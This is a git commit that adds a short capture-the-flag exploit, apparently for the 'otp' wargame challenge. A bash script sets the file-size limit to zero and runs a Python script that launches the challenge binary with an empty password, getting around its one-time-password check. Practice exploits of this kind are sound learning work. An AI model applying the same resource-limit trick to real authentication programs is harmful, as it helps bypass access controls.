d70cd06d91970c586fe4222fdc6808638098f5e8
faker <b09780978@gmail.com>
2017-10-26 20:20:02 +0800

    [+] Finish otp and add fsb/flag

---
+++ otp/exp.py
@@ -0,0 +1,6 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+import subprocess
+
+subprocess.Popen(['/home/otp/otp', ''], cwd="/home/otp/", stderr=subprocess.STDOUT)
+
---
+++ otp/exp.sh
@@ -0,0 +1,3 @@
+#!/usr/bin/env bash
+ulimit -f 0
+python exp.py
